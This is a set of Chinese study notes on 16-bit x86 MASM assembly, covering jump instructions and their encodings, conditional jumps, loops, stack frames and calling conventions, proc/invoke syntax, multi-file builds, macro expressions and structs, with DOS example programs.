<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data_seg segment</span><br><span class="line">	g_szSrc db &quot;hello world&quot;, &#x27;$&#x27;</span><br><span class="line">	g_szSrcEnd db ?</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">buf_seg segment</span><br><span class="line">	g_szDst db 16 dup(0)</span><br><span class="line">	g_szDstEnd db ?</span><br><span class="line">buf_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">START:</span><br><span class="line">	assume ds:data_seg</span><br><span class="line">	mov ax, data_seg   ; 这三句是固定的基本上，不然会找错值</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	mov ax, buf_seg   ; 这三句是固定的基本上，不然会找错值</span><br><span class="line">	mov es, ax  ; 因为di用的是es</span><br><span class="line">	</span><br><span class="line">	lea si, g_szSrc</span><br><span class="line">	lea di, g_szDst</span><br><span class="line">	cld</span><br><span class="line">	mov cx, offset g_szSrcEnd</span><br><span class="line">	sub cx, offset g_szSrc</span><br><span class="line">	rep movsb ;cx每次减一</span><br><span class="line">code_seg ends</span><br><span class="line">end START ;-p参数</span><br></pre></td></tr></table></figure>

<h3 id="流程转移指令"><a href="#流程转移指令" class="headerlink" title="流程转移指令"></a>流程转移指令</h3><h4 id="无条件跳转"><a href="#无条件跳转" class="headerlink" title="无条件跳转"></a>无条件跳转</h4><h5 id="直接跳转"><a href="#直接跳转" class="headerlink" title="直接跳转"></a>直接跳转</h5><table>
<thead>
<tr>
<th>名称</th>
<th>修饰关键词（可选）</th>
<th>格式</th>
<th>功能</th>
<th>指令长度</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>短跳(单字)</td>
<td>short</td>
<td>jmp short 标号</td>
<td>ip &lt;- 标号偏移</td>
<td>2</td>
<td>0005:EB0B    <br>jmp 0012</td>
</tr>
<tr>
<td>近跳(双字)</td>
<td>near ptr</td>
<td>jmp near 标号</td>
<td>ip &lt;- 标号偏移</td>
<td>3</td>
<td>0007:E90a01  <br>jmp 0114</td>
</tr>
<tr>
<td>远跳(四字)</td>
<td>far ptr</td>
<td>jmp far ptr 标号<br>jmp 段名:标号</td>
<td>ip &lt;- 标号偏移<br>cs &lt;- 段地址</td>
<td>5</td>
<td>0000:EA00007c07 <br>jmp 077C:0000</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code_seg0 segment</span><br><span class="line">LABEL2:</span><br><span class="line">	mov cx, cx</span><br><span class="line">code_seg0 ends</span><br><span class="line">code_seg segment</span><br><span class="line">START:</span><br><span class="line">    jmp far ptr LABEL2 ; jmp code_seg0:LABEL2</span><br><span class="line">    jmp short LEABEL0</span><br><span class="line">    mov ax, ax</span><br><span class="line">LEABEL0:</span><br><span class="line">	jmp near ptr LEABEL1</span><br><span class="line">	db 256 dup(0)</span><br><span class="line">	mov bx, bx</span><br><span class="line">LEABEL1:</span><br><span class="line">	mov ax, 4c00h</span><br><span class="line">	int 21h</span><br><span class="line">code_seg ends</span><br><span class="line">end START</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/54.png" class title="This is an example image">

<p>Jmp下条指令+偏移</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;计算机器码</span><br><span class="line">;短跳0xEB，近跳0XE9</span><br><span class="line">0AE7:0102 jmp 0120 ; 短跳是一个字节，两个十六进制 120-104 = EB1C，主要是计算下条指令的偏移</span><br><span class="line">0AE7:0102 jmp 0320 ; 近跳是两个字节，四个十六进制 320-105 = E91B02，因为三个位可以表示？</span><br><span class="line">0AE7:0102 jmp 0020 ; E91BFF，补码E4用单字(-128-127)存不下，要用近跳</span><br><span class="line">0AE7:0402 jmp 0100</span><br><span class="line">0AE7:0122 jmp 0110</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/51.png" class title="This is an example image">

<h5 id="无指令跳转"><a href="#无指令跳转" class="headerlink" title="无指令跳转"></a>无指令跳转</h5><p>使用寄存器间接转移</p>
<ul>
<li>格式 jmp reg</li>
<li>reg为通用寄存器</li>
<li>功能 ip&lt;-reg</li>
<li>只能用于段内转移</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, offset LEABEL1</span><br><span class="line">jmp ax</span><br></pre></td></tr></table></figure>

<h4 id="条件跳转"><a href="#条件跳转" class="headerlink" title="条件跳转"></a>条件跳转</h4><p>依据标志位判断，条件成立则跳转，条件不成立则不跳</p>
<h5 id="单条件跳转"><a href="#单条件跳转" class="headerlink" title="单条件跳转"></a>单条件跳转</h5><table>
<thead>
<tr>
<th>指令</th>
<th>英文单词</th>
<th>标志</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>JZ&#x2F;JE</strong></td>
<td><strong>zero,equal</strong></td>
<td><strong>ZF&#x3D;1</strong></td>
<td><strong>相等&#x2F;等于零</strong></td>
</tr>
<tr>
<td><strong>JNZ&#x2F;JNE</strong></td>
<td><strong>not zero,not qual</strong></td>
<td><strong>ZF&#x3D;0</strong></td>
<td><strong>不相等，不等于零</strong></td>
</tr>
<tr>
<td><strong>JCXZ</strong></td>
<td><strong>CX is zero</strong></td>
<td><strong>CX&#x3D;0</strong></td>
<td><strong>cx为0</strong></td>
</tr>
<tr>
<td>JS</td>
<td>sign</td>
<td>SF &#x3D; 1</td>
<td>结果为负</td>
</tr>
<tr>
<td>JNS</td>
<td>not sign</td>
<td>SF &#x3D; 0</td>
<td>结果为正</td>
</tr>
<tr>
<td>JP&#x2F;JPE</td>
<td>parity, parity even</td>
<td>PF &#x3D; 1</td>
<td>1为偶数个</td>
</tr>
<tr>
<td>JNP&#x2F;JPO</td>
<td>not parity, parity odd</td>
<td>PF &#x3D; 0</td>
<td>1为奇数个</td>
</tr>
<tr>
<td>JO</td>
<td>overflow</td>
<td>OF &#x3D; 1</td>
<td>溢出</td>
</tr>
<tr>
<td>JNO</td>
<td>not overlow</td>
<td>OF &#x3D; 0</td>
<td>不溢出</td>
</tr>
<tr>
<td>JC</td>
<td>carry</td>
<td>CF &#x3D; 1</td>
<td>进位，小于</td>
</tr>
<tr>
<td>JNC</td>
<td>not carry</td>
<td>CF &#x3D; 0</td>
<td>不进位，大于等于</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FIND:</span><br><span class="line">	cmp byte ptr [si], &#x27;$&#x27;</span><br><span class="line">	je ENDFIND</span><br><span class="line">	</span><br><span class="line">	inc si</span><br><span class="line">	jmp FIND</span><br><span class="line">ENDFIND:</span><br><span class="line">	sub si, 1</span><br></pre></td></tr></table></figure>

<h5 id="无符号数判断"><a href="#无符号数判断" class="headerlink" title="无符号数判断"></a>无符号数判断</h5><table>
<thead>
<tr>
<th>指令</th>
<th>英文</th>
<th>说明</th>
<th>标志</th>
</tr>
</thead>
<tbody><tr>
<td><strong>JB</strong></td>
<td><strong>below</strong></td>
<td><strong>小于</strong></td>
<td><strong>cf &#x3D; 1</strong></td>
</tr>
<tr>
<td>JNAE</td>
<td>not greater or equal</td>
<td>不大于等于</td>
<td>cf &#x3D; 1</td>
</tr>
<tr>
<td><strong>JAE</strong></td>
<td><strong>above or equal</strong></td>
<td><strong>大于等于</strong></td>
<td><strong>cf &#x3D;0</strong></td>
</tr>
<tr>
<td>JNB</td>
<td>not below</td>
<td>不小于</td>
<td>cf &#x3D;0</td>
</tr>
<tr>
<td><strong>JBE</strong></td>
<td><strong>below or equal</strong></td>
<td><strong>小于等于</strong></td>
<td><strong>cf &#x3D; 1 或 zf &#x3D; 1</strong></td>
</tr>
<tr>
<td>JNA</td>
<td>not above</td>
<td>不大于</td>
<td>同 JBE</td>
</tr>
<tr>
<td><strong>JA</strong></td>
<td><strong>above</strong></td>
<td><strong>大于</strong></td>
<td><strong>cf &#x3D;0 或 zf &#x3D;0</strong></td>
</tr>
<tr>
<td>JNBE</td>
<td>not below or equal</td>
<td>不小于等于</td>
<td>同 JA</td>
</tr>
</tbody></table>
<h5 id="有符号数判断"><a href="#有符号数判断" class="headerlink" title="有符号数判断"></a>有符号数判断</h5><table>
<thead>
<tr>
<th>指令</th>
<th>英文单词</th>
<th>说明</th>
<th>标志</th>
</tr>
</thead>
<tbody><tr>
<td>JL</td>
<td>less</td>
<td>小于</td>
<td>SF !&#x3D; OF</td>
</tr>
<tr>
<td>JNGE</td>
<td>not greater or equal</td>
<td>不大于等于</td>
<td>SF !&#x3D; OF</td>
</tr>
<tr>
<td>JG</td>
<td>greater</td>
<td>大于</td>
<td>SF &#x3D; OF 且<br>ZF &#x3D; 0</td>
</tr>
<tr>
<td>JNLE</td>
<td>not less or equal</td>
<td>不小于等于</td>
<td>同 JG</td>
</tr>
<tr>
<td>JLE</td>
<td>less or equal</td>
<td>小于等于</td>
<td>ZF !&#x3D; OF 或<br>ZF &#x3D; 1</td>
</tr>
<tr>
<td>JNG</td>
<td>not greator</td>
<td>不大于</td>
<td>同 JLE</td>
</tr>
<tr>
<td>JGE</td>
<td>greator orequal</td>
<td>大于等于</td>
<td>SF &#x3D; OF</td>
</tr>
<tr>
<td>JNL</td>
<td>not less</td>
<td>不小于</td>
<td>同 JGE</td>
</tr>
</tbody></table>
<h4 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h4><p>格式：loop标号</p>
<p>只能用于短转移</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>重复条件</th>
</tr>
</thead>
<tbody><tr>
<td>LOOP</td>
<td>cx !&#x3D; 0</td>
</tr>
<tr>
<td>LOOPZ&#x2F;LOOPE</td>
<td>cx !&#x3D; 0 且 zf &#x3D; 1</td>
</tr>
<tr>
<td>LOOPNZ&#x2F;LOOPNE</td>
<td>cx !&#x3D; 0 且 zf &#x3D; 0</td>
</tr>
</tbody></table>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><p>call - push 下一条指令地址<br>           jmp 目标地址</p>
<p>ret n - 弹出返回地址<br>       jmp到返回地址<br>       add sp, n</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack_seg segment stack ;栈会自动加载</span><br><span class="line">	db 256 dup(0cch) ;为栈申请大小</span><br><span class="line">stack_seg ends</span><br><span class="line"></span><br><span class="line">data_seg segment</span><br><span class="line">	g_sz1 db &quot;1hello world$&quot;</span><br><span class="line">	g_sz2 db &quot;2hello world$&quot;</span><br><span class="line">	g_sz3 db &quot;3hello world$&quot;</span><br><span class="line">	g_sz4 db &quot;4hello world$&quot;</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">	assume ds:data_seg, ss:stack_seg</span><br><span class="line"></span><br><span class="line">PUTS0:</span><br><span class="line">	push bp</span><br><span class="line">	mov bp, sp</span><br><span class="line">	push dx</span><br><span class="line">	mov dx, [bp+4]</span><br><span class="line">	mov ah, 09h</span><br><span class="line">	int 21h</span><br><span class="line">	</span><br><span class="line">	mov dl, 0ah</span><br><span class="line">	mov ah, 02h</span><br><span class="line">	int 21h</span><br><span class="line">	</span><br><span class="line">	pop dx</span><br><span class="line">	pop bp</span><br><span class="line">	ret 2 ;sp+2，一个参数+2</span><br><span class="line"></span><br><span class="line">PUTS:</span><br><span class="line">	push bp</span><br><span class="line">	mov bp, sp</span><br><span class="line">	sub sp, 8 ;申请局部变量空间</span><br><span class="line">	</span><br><span class="line">	;保存寄存器环境</span><br><span class="line">	push dx</span><br><span class="line">	</span><br><span class="line">	mov dx, [bp+4]</span><br><span class="line">	mov ah, 09h</span><br><span class="line">	int 21h</span><br><span class="line">	</span><br><span class="line">	mov word ptr [bp-4], 5566h</span><br><span class="line">	mov word ptr [bp-8], 7788h ;多个函数调用要手动规划栈</span><br><span class="line">	</span><br><span class="line">	mov dx, offset g_sz1</span><br><span class="line">	push dx</span><br><span class="line">	call PUTS0 ;多个函数调用要手动规划栈</span><br><span class="line">	</span><br><span class="line">	mov dl, 0ah</span><br><span class="line">	mov ah, 02h</span><br><span class="line">	int 21h</span><br><span class="line">	</span><br><span class="line">	;恢复寄存器环境</span><br><span class="line">	pop dx</span><br><span class="line">	add sp, 8 ;释放局部变量空间   mov sp, bp</span><br><span class="line">	pop bp ;pop就直接更新bp的值吗</span><br><span class="line">	ret 2 ;sp+2，一个参数+2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">StrLen:</span><br><span class="line">	push bp</span><br><span class="line">	mov bp, sp</span><br><span class="line">	</span><br><span class="line">	push si</span><br><span class="line">	push bx</span><br><span class="line">	</span><br><span class="line">	mov bx, [bp+4] ;获取参数</span><br><span class="line">	mov si, bx</span><br><span class="line">FIND:</span><br><span class="line">	cmp byte ptr [si], &#x27;$&#x27;</span><br><span class="line">	je ENDFIND</span><br><span class="line">	inc si</span><br><span class="line">	jmp FIND</span><br><span class="line">ENDFIND:</span><br><span class="line">	sub si, bx</span><br><span class="line">	;ax为函数默认返回值，默认不用入栈平栈</span><br><span class="line">	mov ax, si</span><br><span class="line">	</span><br><span class="line">	pop bx</span><br><span class="line">	pop si</span><br><span class="line">	</span><br><span class="line">	mov sp, bp</span><br><span class="line">	pop bp</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">START:</span><br><span class="line">	mov ax, data_seg</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	mov ax, offset g_sz1</span><br><span class="line">	push ax</span><br><span class="line">	call StrLen</span><br><span class="line">	add sp, 2  ;此处如果是 ret 2就可以不用在外面平</span><br><span class="line">	</span><br><span class="line">	mov ax, offset g_sz2</span><br><span class="line">	push ax</span><br><span class="line">	call StrLen</span><br><span class="line">	add sp, 2</span><br><span class="line">	</span><br><span class="line">	mov dx, offset g_sz1</span><br><span class="line">	push dx   ;参数入栈</span><br><span class="line">	call PUTS ;返回地址入栈</span><br><span class="line">	</span><br><span class="line">	mov dx, offset g_sz2</span><br><span class="line">	push dx</span><br><span class="line">	call PUTS</span><br><span class="line">	</span><br><span class="line">	mov dx, offset g_sz3</span><br><span class="line">	push dx</span><br><span class="line">	call PUTS</span><br><span class="line">	</span><br><span class="line">	mov dx, offset g_sz4</span><br><span class="line">	push dx</span><br><span class="line">	call PUTS</span><br><span class="line">	</span><br><span class="line">	;程序退出，退出码0</span><br><span class="line">	mov ax, 4c00h</span><br><span class="line">	int 21h</span><br><span class="line">code_seg ends</span><br><span class="line">end START ;-p参数</span><br></pre></td></tr></table></figure>



<p>bp用的是ss段，bx用的是dx段，栈是【局部变量】【bp】【返回地址】【入参】</p>
<p>函数执行流程</p>
<ul>
<li>参数入栈 </li>
<li>返回地址入栈，跳转到函数</li>
<li>保存栈帧（就是栈内给某个上下文环境临时规划的局部栈）</li>
<li>申请局部变量空间</li>
<li>保存寄存器环境</li>
<li>执行函数功能</li>
<li>恢复寄存器环境</li>
<li>恢复栈帧</li>
<li>弹出返回地址，返回[平栈]</li>
<li>[平栈]</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">agv -&gt; ret -&gt; bp -&gt;局部变量</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>指令(可选)</th>
<th>说明</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>call (near ptr) 标号</td>
<td>段内直接调用</td>
<td>push 返回地址<br>jmp 标号</td>
</tr>
<tr>
<td>call REG<br>call near ptr | word ptr [EA]</td>
<td>段内间接调用</td>
<td>push 返回地址<br>jmp 函数地址</td>
</tr>
<tr>
<td>call far ptr 标号<br>call dword ptr [EA]</td>
<td>段间调用</td>
<td>push</td>
</tr>
<tr>
<td>ret(n)</td>
<td>段内返回</td>
<td>pop ip<br>add sp,n</td>
</tr>
<tr>
<td>retf(n)</td>
<td>段间返回</td>
<td>pop ip<br>pop cs<br>add sp, n</td>
</tr>
</tbody></table>
<h4 id="masm函数语法"><a href="#masm函数语法" class="headerlink" title="masm函数语法"></a>masm函数语法</h4><p>自动算偏移，bp，sp入栈平栈</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数名 proc[距离][调用约定][uses reg1 reg2..][参数：word, 参数名：word..] ;uses保存寄存器环境</span><br><span class="line">	local 变量：word</span><br><span class="line">	local 变量: word</span><br><span class="line">	ret</span><br><span class="line">函数名 endp</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">TestProc PROC far stdcall uses bx dx si di arg1:word</span><br><span class="line">	local btVal:byte</span><br><span class="line">	ret</span><br><span class="line">TestProc ENDP</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>距离关键字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>near</td>
<td>函数只能段内调用<br>函数使用ret返回<br>调用时ip入栈</td>
</tr>
<tr>
<td>far</td>
<td>段内段间都可调用<br>函数使用retf返回<br>调用时都是ip和cs入栈</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>调用约定关键词</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>C</td>
<td>调用方平栈</td>
</tr>
<tr>
<td>stdcall</td>
<td>被调用方平栈</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include tool.inc</span><br><span class="line"></span><br><span class="line">stack_seg segment stack ;栈会自动加载</span><br><span class="line">	db 256 dup(0cch) ;为栈申请大小</span><br><span class="line">stack_seg ends</span><br><span class="line"></span><br><span class="line">data_seg segment</span><br><span class="line">    g_wVa11 dw 5566h</span><br><span class="line">    g_wVa12 dw 7788</span><br><span class="line">    g_szFileName db &quot;test.txt&quot;, 0</span><br><span class="line">    g_buf db 256 dup(0)</span><br><span class="line">    g_hFile dw 0</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">	assume ds:data_seg, ss:stack_seg</span><br><span class="line">START:</span><br><span class="line">	mov ax, data_seg</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	invoke OpenFile, offset g_szFileName</span><br><span class="line">	cmp ax,-1 ;打开文件成功返回句柄，不成功返回错误码</span><br><span class="line">	je ERROR</span><br><span class="line">	mov g_hFile, ax</span><br><span class="line">	invoke Readfile, g_hFile, offset g_buf, size g_buf</span><br><span class="line">	cmp ax,0</span><br><span class="line">	je ERROR</span><br><span class="line">	invoke CloseFile, g_hFile</span><br><span class="line">ERROR:</span><br><span class="line">	;宏汇编</span><br><span class="line">	invoke MySub, 45, 13 ;使用立即数时，会用ax中转</span><br><span class="line">	</span><br><span class="line">	mov si, 9</span><br><span class="line">	mov di, 8</span><br><span class="line">	invoke MySub, si, di</span><br><span class="line">	</span><br><span class="line">	invoke MySub, g_wVa12, g_wVa11</span><br><span class="line">	</span><br><span class="line">	mov ax, 45</span><br><span class="line">	push ax</span><br><span class="line">	mov ax, 13</span><br><span class="line">	push ax</span><br><span class="line">	call MySub</span><br><span class="line">	add sp, 4</span><br><span class="line">	</span><br><span class="line">	;程序结束，退出码0</span><br><span class="line">	mov ax, 4C00H</span><br><span class="line">	INT 21H</span><br><span class="line">code_seg ends</span><br><span class="line">end START </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>类型</th>
<th>局部变量类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>db</td>
<td>byte</td>
<td>可以直接赋值使用</td>
</tr>
<tr>
<td>dw</td>
<td>word</td>
<td>可以直接赋值使用</td>
</tr>
<tr>
<td>dd</td>
<td>dword</td>
<td>不可以直接赋值使用</td>
</tr>
<tr>
<td>dq</td>
<td>qword</td>
<td>不可以直接赋值使用</td>
</tr>
<tr>
<td>dt</td>
<td>tbyte</td>
<td>不可以直接赋值使用</td>
</tr>
</tbody></table>
<p>assume、invoke：没有对应的机器码，给编译器看的，伪指令</p>
<h5 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">invoke 函数名, 参数1, 参数2, 参数3</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li>会生成参数入栈代码</li>
<li>如果是c调用约定，会生成平栈代码</li>
<li>如果是局部变量取地址，需要使用addr伪指令</li>
<li>使用addr的时候，注意ax的使用</li>
</ul>
<table>
<thead>
<tr>
<th>伪指令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>offset</td>
<td>取段内偏移</td>
</tr>
<tr>
<td>addr</td>
<td>取局部变量的地址，使用LEA指令</td>
</tr>
</tbody></table>
<h4 id="文件引用"><a href="#文件引用" class="headerlink" title="文件引用"></a>文件引用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;tool.asm</span><br><span class="line">include tool.inc</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line"></span><br><span class="line">CloseFile proc far stdcall uses bx hFile:word</span><br><span class="line">	mov bx, hFile</span><br><span class="line">	mov ah, 3eh</span><br><span class="line">	int 21h</span><br><span class="line">	ret</span><br><span class="line">CloseFile ENDP</span><br><span class="line"></span><br><span class="line">ReadFile proc far stdcall uses bx dx cx hFile:word, pBuff:word, nBufSize:word</span><br><span class="line">	mov bx, hFile</span><br><span class="line">	mov ah, 3fh</span><br><span class="line">	mov dx, pBuff</span><br><span class="line">	mov cx, nBufSize</span><br><span class="line">	int 21H</span><br><span class="line">	jnc SUCESS</span><br><span class="line">	;失败</span><br><span class="line">	mov ax,0</span><br><span class="line">	ret</span><br><span class="line">SUCESS:</span><br><span class="line">	ret</span><br><span class="line">ReadFile ENDP</span><br><span class="line"></span><br><span class="line">OpenFile proc far stdcall uses dx szFileName:word</span><br><span class="line">	mov ah, 3dh</span><br><span class="line">	mov al, 02h ;可读，可写</span><br><span class="line">	mov dx, szFileName</span><br><span class="line">	int 21H</span><br><span class="line">	jnc SUCESS</span><br><span class="line">	;失败</span><br><span class="line">	mov ax,-1</span><br><span class="line">	ret</span><br><span class="line">SUCESS:</span><br><span class="line">	;成功</span><br><span class="line">	ret</span><br><span class="line">OpenFile ENDP</span><br><span class="line"></span><br><span class="line">MySub PROC far c uses cx di es nVal1:word, nVal2:word</span><br><span class="line">	local @btVar1:byte ;局部变量标识，非必须</span><br><span class="line">	local @wVa11:word</span><br><span class="line">	local @dwVal1:dword</span><br><span class="line">	local @buf[256]:byte</span><br><span class="line">	</span><br><span class="line">	xor ax, ax</span><br><span class="line">	mov @btvar1,al</span><br><span class="line">	mov @wVal1,ax</span><br><span class="line">	;mov @dwval1,ax</span><br><span class="line">	</span><br><span class="line">	;lea bx, @buf</span><br><span class="line">	invoke MyZeroMem,ss,addr @buf,255 ;add 取局部变量的地址，I专用于invoke</span><br><span class="line">	;去局部变量地址用 offset ?</span><br><span class="line">	</span><br><span class="line">	mov ax, nVal1</span><br><span class="line">	mov ax, nVal2</span><br><span class="line">	ret</span><br><span class="line">MySub ENDP</span><br><span class="line">MyZeroMem PROC far stdcall uses di cx es pSecBase:word, pBuff:word, nSize:word</span><br><span class="line">	xor ax, ax</span><br><span class="line">	mov es, pSecBase</span><br><span class="line">	mov cx, nSize</span><br><span class="line">	mov di, pBuff</span><br><span class="line">	rep stosb</span><br><span class="line">	ret</span><br><span class="line">MyZeroMem ENDP</span><br><span class="line">code_seg ends</span><br><span class="line">ends ;每个asm文件都要以ends结尾</span><br></pre></td></tr></table></figure>

<p>声明头文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;tool.inc</span><br><span class="line">MySub PROTO far c :word, :word</span><br><span class="line">MyZeroMem PROTO far stdcall :word, :word, :word</span><br><span class="line">;功能 - 创建文件，如果文件存在，则清空</span><br><span class="line">;参数 - </span><br><span class="line">;	szFileName - 文件名，0结尾字符串</span><br><span class="line">;返回 - </span><br><span class="line">;	失败 - 返回 -1 </span><br><span class="line">;	成功-返回文件句柄</span><br><span class="line">CreateFile PROTO far stdcall szFileName:word</span><br><span class="line">ReadFile PROTO far stdcall hFile:Word, pBuff:word, nBufSize:word</span><br><span class="line">CloseFile PROTO far stdcall hFile:word</span><br><span class="line">OpenFile PROTO far stdcall szFileName:word</span><br></pre></td></tr></table></figure>

<p>需要同时编译两个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ml /c test.asm tool.asm</span><br><span class="line">link test.obj tool.obj</span><br></pre></td></tr></table></figure>

<p>PS：</p>
<p>调试小技巧，int 3 &#x2F; db 0cch，直接 -g 会go到中断处，-p执行当前语句（不进入）</p>
<p>MASM扩展在这个扩展的设置中，有一个名为<code>Working mode</code>。默认情况下，它被设置为单个文件。如果您更改为工作区，它将挂载整个dir。</p>
<h4 id="宏汇编"><a href="#宏汇编" class="headerlink" title="宏汇编"></a>宏汇编</h4><h5 id="表达式-org"><a href="#表达式-org" class="headerlink" title="表达式  $  org  @@"></a>表达式  $  org  @@</h5><p>表达式需要能够在编译阶段计算结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack_seg segment stack ;栈会自动加载</span><br><span class="line">	db 256 dup(0cch) ;为栈申请大小</span><br><span class="line">stack_seg ends</span><br><span class="line"></span><br><span class="line">data_seg segment</span><br><span class="line">	g_dbVal0 db 11h</span><br><span class="line">	org 10h</span><br><span class="line">	g_dbVal1 db 22h</span><br><span class="line">	org 20h</span><br><span class="line">	g_dbVal3 db 33h</span><br><span class="line"></span><br><span class="line">	g_wBuf dw 256 dup(0) ;相当于100个word,200个字节</span><br><span class="line">	;g_wBufLen dw offset g_wBufLen - offset g_wBuf ;?</span><br><span class="line">	g_wBufLen dw $ - offset g_wBuf</span><br><span class="line">	</span><br><span class="line">	org 400h ;下个段偏移位置从400开始</span><br><span class="line">	g_wVal0 dw 5566h</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">	assume ds:data_seg, ss:stack_seg</span><br><span class="line">START:</span><br><span class="line">	mov ax, data_seg</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	mov ax, g_wBufLen</span><br><span class="line">	mov dx, size g_wBuf / size word ;看值</span><br><span class="line">	mov ax, g_wVal0 / 2 ;报错，无法在编译阶段计算结果</span><br><span class="line">	mov ax, offset g_wVal0 - offset g_wBuf</span><br><span class="line">	</span><br><span class="line">	mov ax, 1122h and 5566h ;运算符</span><br><span class="line">	mov ax, 3344h or 7788h</span><br><span class="line">	mov ax, not 0</span><br><span class="line">	and g_wVal0, 5566h ;指令</span><br><span class="line">	</span><br><span class="line">	mov ax，6 1e 4 ;关系为假，结果为0</span><br><span class="line">	mov ax，7 gt 1 ;关系为真，结果为全F</span><br><span class="line">	</span><br><span class="line">	@@:</span><br><span class="line">		xor ax, ax</span><br><span class="line">	@@:</span><br><span class="line">		mov ax, ax</span><br><span class="line">		mov bx,bx</span><br><span class="line">		jmp @f  ;就近向下跳</span><br><span class="line">		mov si, si</span><br><span class="line">		jmp @b  ;就近向上跳</span><br><span class="line">	@@:</span><br><span class="line">		mov cx, cx</span><br><span class="line">		mov dx, dx</span><br><span class="line">	@@:</span><br><span class="line">		xor bx,bx</span><br><span class="line">	</span><br><span class="line">	mov ax, offset NEXT</span><br><span class="line">	mov ax, $+3</span><br><span class="line">	NEXT:</span><br><span class="line">	mov bx, $</span><br><span class="line">	mov ax, $</span><br><span class="line">	mov ax, $</span><br><span class="line">	</span><br><span class="line">	;程序结束，退出码0</span><br><span class="line">	mov ax, 4C00H</span><br><span class="line">	INT 21H</span><br><span class="line">code_seg ends</span><br><span class="line">end START </span><br></pre></td></tr></table></figure>

<h5 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack_seg segment stack ;栈会自动加载</span><br><span class="line">	db 256 dup(0cch) ;为栈申请大小</span><br><span class="line">stack_seg ends</span><br><span class="line"></span><br><span class="line">MyTestTag struc </span><br><span class="line">	m_bval db θ</span><br><span class="line">	m_wVal dw 0</span><br><span class="line">	m_buf db 10 dup (0)</span><br><span class="line">MyTestTag ends</span><br><span class="line"></span><br><span class="line">data_seg segment</span><br><span class="line">	g_tag MyTestTag &lt;55h, 7788h, &quot;hello struct!&quot;&gt;</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">MyTest proc far stdcall pTag:ptr MyTestTag</span><br><span class="line">	assume si:ptr MyTestTag</span><br><span class="line">	mov si, pTag</span><br><span class="line">	mov ax, [si].m_wVal</span><br><span class="line">	assume si:nothing</span><br><span class="line">	</span><br><span class="line">	mov bx, pTag</span><br><span class="line">	mov ax, word ptr [bx+2]</span><br><span class="line">	</span><br><span class="line">	ret</span><br><span class="line">MyTest endp</span><br><span class="line">	assume ds:data_seg, ss:stack_seg</span><br><span class="line">START:</span><br><span class="line">	mov ax, data_seg</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	mov al, g_tag.m_bVal</span><br><span class="line">	mov ax, g_tag.m_wVal</span><br><span class="line">	lea ax, g_tag.m_buf</span><br><span class="line">	</span><br><span class="line">	mov g_tag.m_bval, 66h</span><br><span class="line">	mov g_tag.m_wVal, 1234h</span><br><span class="line"></span><br><span class="line">	invoke MyTest, offset g_tag</span><br><span class="line">	</span><br><span class="line">	; local @stu：Students ;结构体局部变量</span><br><span class="line">	; mov @stu.m_id, 6 ;使用结构体局部变量</span><br><span class="line">	</span><br><span class="line">	;程序结束，退出码0</span><br><span class="line">	mov ax, 4C00H</span><br><span class="line">	INT 21H</span><br><span class="line">code_seg ends</span><br><span class="line">end START </span><br></pre></td></tr></table></figure>

